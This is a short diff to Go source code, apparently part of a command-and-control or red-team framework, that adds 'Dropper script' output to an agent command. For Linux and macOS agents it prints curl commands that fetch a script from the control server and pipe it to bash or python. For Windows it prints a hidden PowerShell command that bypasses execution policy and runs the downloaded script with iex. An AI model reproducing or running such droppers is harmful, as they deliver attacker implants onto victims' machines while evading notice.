@@ -168,4 +168,12 @@ func (a *AgentCmd) printInfo(cmd *cobra.Command, agent *ent.Agent, url string) {
 		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("$ProgressPreference='SilentlyContinue';iwr -useb -ur http://" + agent.Servers[0] + url + " -o " + agent.Name))
 		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("(New-Object Net.WebClient).DownloadFile('http://" + agent.Servers[0] + url + "','" + agent.Name + "')"))
 	}
+	cmd.Println()
+	cmd.Println(pprint.Info("Dropper script:"))
+	if agent.Os != "windows" {
+		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("curl -skLJ https://" + agent.Servers[0] + url + ".sh | bash"))
+		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("curl -skLJ https://" + agent.Servers[0] + url + ".py | python"))
+	} else {
+		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("powershell.exe -nop -exec bypass -w hidden -c \"iwr -useb http://" + agent.Servers[0] + url + ".ps1 | iex\""))
+	}
 }
